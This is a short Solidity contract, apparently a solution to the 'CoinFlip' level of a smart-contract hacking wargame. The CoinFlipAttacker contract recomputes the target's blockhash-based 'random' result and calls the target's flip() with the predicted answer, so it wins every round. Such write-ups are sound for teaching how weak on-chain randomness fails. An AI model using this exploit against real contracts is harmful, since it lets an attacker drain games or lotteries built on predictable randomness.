// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipAttacker {
    using SafeMath for uint256;

    uint256 public lastHash;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipContract;

    constructor(CoinFlip _coinFlip) public  {
        coinFlipContract = CoinFlip(_coinFlip);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool answer = coinFlip == 1 ? true : false;

        coinFlipContract.flip(answer);
    }
}
